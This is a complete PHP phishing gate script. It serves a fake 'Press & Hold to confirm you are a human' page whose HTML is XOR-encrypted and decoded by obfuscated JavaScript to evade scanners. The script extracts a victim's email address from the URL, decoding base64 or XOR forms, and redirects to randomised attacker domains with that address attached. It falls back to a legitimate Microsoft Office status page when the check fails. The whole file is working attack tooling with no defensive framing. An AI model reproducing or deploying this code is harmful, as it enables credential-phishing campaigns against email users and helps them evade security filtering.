<?php

// Set your destination links here:'https://'. randomString(10) .'.lekouignamann.com/'. randomString(26) .'#X',
$Destinations = [
    'https://'. randomString(5) .'.onfoalsev.com/W3USK/#D',
];


// Set your failed redirect link here:
const FailedDestination = 'https://portal.office.com/servicestatus';

if ((($_GET['js'] ?? '') === 'u')) {
    header('content-type: application/json');
    if ((($_GET['sid'] ?? '') === md5('125336')))
    exit(json_encode(['success' => true, 'data' => base64_encode(json_encode(['dest' =>  $Destinations, 'failedDest' => FailedDestination]))]));
    else exit(json_encode(['success' => false]));
}

if (($_GET['js'] ?? '') === 'dec') {
    header('content-type: text/javascript');
    exit(<<<JS
const _0x320982=_0x3650;(function(_0x17e08d,_0x3fbacf){const _0x57cd7d=_0x3650,_0x3d5212=_0x17e08d();while(!![]){try{const _0x18c326=-parseInt(_0x57cd7d(0x8a))/0x1+parseInt(_0x57cd7d(0x87))/0x2+-parseInt(_0x57cd7d(0x78))/0x3*(-parseInt(_0x57cd7d(0x81))/0x4)+-parseInt(_0x57cd7d(0x82))/0x5*(parseInt(_0x57cd7d(0x80))/0x6)+parseInt(_0x57cd7d(0x83))/0x7+parseInt(_0x57cd7d(0x8d))/0x8+parseInt(_0x57cd7d(0x7f))/0x9;if(_0x18c326===_0x3fbacf)break;else _0x3d5212['push'](_0x3d5212['shift']());}catch(_0x1391b9){_0x3d5212['push'](_0x3d5212['shift']());}}}(_0x141d,0x54414));const current_script=document[_0x320982(0x86)],selector=current_script['getAttribute'](_0x320982(0x7a))||_0x320982(0x8e),key=Number(current_script[_0x320982(0x90)]('data-key'));function _0x141d(){const _0x1e401e=['getElementsByTagName','appendChild','currentScript','295842ubWBDR','style','childNodes','438393WGCxux','querySelector','removeAttribute','2179136cfFEae','div.container','forEach','getAttribute','body','parseFromString','length','head','onload','fromCharCode','48cdfEnb','innerHTML','data-selector','data-enc','script','text','cloneNode','1094517DUlRpG','351114uZALMo','127892KczmNt','35gAfhsx','977480fINuPV'];_0x141d=function(){return _0x1e401e;};return _0x141d();}function _0x3650(_0xe2d4c,_0x1a1a79){const _0x141d10=_0x141d();return _0x3650=function(_0x3650e1,_0x58eac6){_0x3650e1=_0x3650e1-0x76;let _0x476259=_0x141d10[_0x3650e1];return _0x476259;},_0x3650(_0xe2d4c,_0x1a1a79);}function decodeString(_0x2f437c){const _0x2928b6=_0x320982;let _0x1d43aa='';for(let _0x1e8ef9=0x0;_0x1e8ef9<_0x2f437c[_0x2928b6(0x93)];_0x1e8ef9++){const _0x577acb=_0x2f437c['charCodeAt'](_0x1e8ef9)^key;_0x1d43aa+=String[_0x2928b6(0x77)](_0x577acb);}return _0x1d43aa;}window[_0x320982(0x76)]=()=>{const _0x409be0=_0x320982,_0x4e7a81=document[_0x409be0(0x8b)](selector),_0xdec922=decodeString(atob(_0x4e7a81[_0x409be0(0x90)](_0x409be0(0x7b))));_0x4e7a81[_0x409be0(0x8c)](_0x409be0(0x7b));const _0x2d6584=new DOMParser(),_0x5d541c=_0x2d6584[_0x409be0(0x92)](_0xdec922,'text/html'),_0x73c278=[..._0x5d541c[_0x409be0(0x91)][_0x409be0(0x89)]]['concat']([..._0x5d541c[_0x409be0(0x94)][_0x409be0(0x89)]]);_0x4e7a81[_0x409be0(0x79)]='',_0x73c278[_0x409be0(0x8f)](_0x11dce5=>{const _0x258a62=_0x409be0;_0x4e7a81[_0x258a62(0x85)](_0x11dce5[_0x258a62(0x7e)](!![]));});const _0x25dae8=[..._0x4e7a81[_0x409be0(0x84)](_0x409be0(0x7c))];for(let _0x2809f6=0x0;_0x2809f6<_0x25dae8[_0x409be0(0x93)];_0x2809f6++){const _0x468645=document['createElement']('script');_0x468645[_0x409be0(0x7d)]=_0x25dae8[_0x2809f6][_0x409be0(0x7d)],_0x25dae8[_0x2809f6]['remove'](),_0x4e7a81[_0x409be0(0x85)](_0x468645);}_0x4e7a81[_0x409be0(0x8c)](_0x409be0(0x88));};
JS);
}

if (($_GET['js'] ?? '') === 'r') {
    header('content-type: text/javascript');
    exit(<<<JS
async function redirect() {
    const data = await resolve()
    const dest = data.dest
    const failedDest = data.failedDest
    let u, p;
    
    p = _fe(window.location.href.split(window.location.host)[1].split('/'))
    if (p) {
        try{
            u = dest[Math.floor(Math.random() * dest.length)] + p.replace('$', '@');
        } catch (e) {
            u = failedDest
        }
    } else {
        u = failedDest;
    }
        
    setTimeout(() => {
        window.location.replace(u)
    }, 1000)
}

async function resolve(wait=false) {
    if (wait) {
        await new Promise((_resolve) => {
        setTimeout(() => {
            _resolve();
        }, 1000);
    });
    }
    let r = await fetch('?js=u&sid='+md5('125336'))
    let data = await r.json()
    return data.success ? JSON.parse(atob(data.data)) : resolve(true)
}

function _fe(_l) {
    let _ve = (_e) => /^[A-Za-z0-9._%+-]+[@$][A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(_e);
    for (const _ev of _l) {
        try {
            if (_ev.length < 4) continue;
            if (/\&|\#|\?|=/.test(_ev)) {
                let __l = _fe(_ev.split(/\&|\#|\?|=/))
                if (__l) {
                    return __l
                }
            }
            if (_ve(_ev)){
                return _ev
            } 
            const _dv = atob(_ev);
            if (_ve(_dv)) {
                return _dv;
            }
            const _ddv = _d(_dv)
            if (_ve(_ddv)) {
                return _ddv;
            }
        } catch (error) {
        }
    }
    return false; 
}

function _d(_s, _k=13) {
    let _e = '';
    const _l = _s.length;

    for (let i = 0; i < _l; i++) {
        const _c = _s.charCodeAt(i) ^ _k;
        _e += String.fromCharCode(_c);
    }

    return _e;
}

redirect()
JS);

}
// PHP code
$key = random_int(1, 250);

function encrypt($str, $key): string
{
    $encoded = '';
    $length = strlen($str);

    for ($i = 0; $i < $length; $i++) {
        $charCode = ord($str[$i]) ^ $key;
        $encoded .= chr($charCode);
    }

    return $encoded;
}
function generateReference(): string
{
    return randomString(8) . '-' . randomString(4) . '-' . randomString(4);
}

function randomString($length): string
{
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $randomString = '';
    $charactersLength = strlen($characters);

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }

    return $randomString;
}
$text = str_replace('REPLACE_REFERENCE', generateReference(), <<<HTML
<style>
        * {
            user-select: none;
        }
        body {
            background-color: #f5f5f5;
            height: 100vh;
            font-family: Arial, sans-serif;
            font-size: 2vw;
            line-height: 1.5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            align-items: center;
            display: flex;
            flex-direction: column;
            height: 400px;
            width: 100vw;
            justify-content: space-between;
            background: white;
            border-radius: 5px;
            box-shadow: 0 0 8px 0 lightgray;
        }

        .container .body {
            align-items: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            flex-grow: 1;
        }
        .container .footer {
            background: #f8f8f8;
            border-top: 1px solid #e8e8e8;
            width: 100%;
            display: flex;
            justify-content: center;
        }
        .logo {
            margin-bottom: 20px;
            width: 100px;
        }
        .text {
            color: #1c1c1c;
            font-size: 16px;
            margin-bottom: 20px;
            text-align: center;
        }
        .head {
            color: #1c1c1c;
            font-size: 28px;
            margin-bottom: 20px;
            text-align: center;
        }

        .button {
            background-color: #ffffff;
            border: 1px solid lightgray;
            border-radius: 40px;
            color: #007ac2;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            transition: background-color 0.3s ease-in-out;
            position: relative;
            overflow: hidden;
        }
        .button:hover {
            background-color: #d1f2ff;
        }
        .progress {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 0;
            background-color: #007ac2;
            transition: width .5s ease-in-out;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .progress.loading .loader {
            display: block;
        }
        .loader {
            display: none;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            position: relative;
            animation: rotate 1s linear infinite
        }
        .loader::before {
            content: "";
            box-sizing: border-box;
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 5px solid #FFF;
            animation: prixClip 2s linear infinite;
        }

        @keyframes rotate {
            100%   {transform: rotate(360deg)}
        }

        @keyframes prixClip {
            0%   {clip-path: polygon(50% 50%, 0 0, 0 0, 0 0, 0 0, 0 0)}
            12%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 0, 100% 0, 100% 0)}
            25%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 100% 100%, 100% 100%)}
            37%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 100%)}
            50%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 0)}
            63%  {clip-path: polygon(50% 50%, 100% 0, 100% 0, 100% 100%, 0 100%, 0 0)}
            75%  {clip-path: polygon(50% 50%, 100% 100%, 100% 100%, 100% 100%, 0 100%, 0 0)}
            87%  {clip-path: polygon(50% 50%, 0 100%, 0 100%, 0 100%, 0 100%, 0 0)}
            100% {clip-path: polygon(50% 50%, 0 0, 0 0, 0 0, 0 0, 0 0)}
        }

        .shake, .shake:hover {
            animation: shake 0.5s;
            animation-iteration-count: 3;
            background-color: #ff0000;
            color: white;
        }
        @keyframes shake {
            0% { transform: translate(0, 0); }
            25% { transform: translate(-5px, 0); }
            50% { transform: translate(0, 0); }
            75% { transform: translate(5px, 0); }
            100% { transform: translate(0, 0); }
        }
        .link {
            color: #007ac2;
            font-size: 14px;
            margin-top: 20px;
            text-decoration: none;
        }
        .reference {
            color: #999;
            font-size: 12px;
            margin: 5px;
        }

        @media screen and (min-width: 700px){
            .container {
                width: 600px;
            }
        }
    </style>
    <div class="body">
        <p class="text">Press & Hold to confirm you are a human (and not a bot).</p>
        <button
                id="hold-button"
                class="button"
                onmousedown="this.classList.add('pressed'); pressAndHold();"
                ontouchstart="this.classList.add('pressed'); pressAndHold();"
                onmouseup="this.classList.remove('pressed');"
                ontouchend="this.classList.remove('pressed');"
        >
            <span id="progress-bar" class="progress"><span class="loader"></span></span>
            Press and Hold
        </button>
    </div>
    <div class="footer">
        <p class="reference">Reference ID: REPLACE_REFERENCE</p>
    </div>
    <script>
        function pressAndHold() {
            const button = document.getElementById("hold-button");
            const progress = document.getElementById("progress-bar");
            progress.classList.remove('loading')
            const startTime = new Date().getTime();
            const timer = setInterval(function () {
                const elapsedTime = new Date().getTime() - startTime;
                let progressWidth = elapsedTime / 10;
                if (progressWidth > 100) {
                    progressWidth = 100;
                    clearInterval(timer);
                    progress.classList.add('loading')
                    button.setAttribute('disabled', 'disabled')
                    document.querySelector('title').innerText = 'Just a moment...'
                    setTimeout(_r, 500)
                }
                progress.style.width = progressWidth + "%";
                if (!button.classList.contains("pressed")) {
                    clearInterval(timer);
                    progress.style.width = "0%";
                    button.classList.add("shake");
                    setTimeout(function () {
                        button.classList.remove("shake");
                        progress.style.width = "0%";
                    }, 500);
                }
            }, 50);
        }
        function _r(){
            const el = document.createElement('script')
            el.src = '?js=r'
            document.querySelector('body').appendChild(el)
        }

    </script>
HTML);

$encrypted_text = encrypt($text, $key)

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <link rel="icon" type="image/x-icon" href="https://faviconos.nyc3.cdn.digitaloceanspaces.com/favicon.ico">
    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.8.3/src/md5.min.js"></script>
    <script src="?js=dec" data-selector="div.container" data-key="<?= $key ?>"></script>
</head>
<body>
<div style="display: none" class="container" data-enc="<?= base64_encode($encrypted_text) ?>"><?= $encrypted_text ?></div>
</body>
</html>
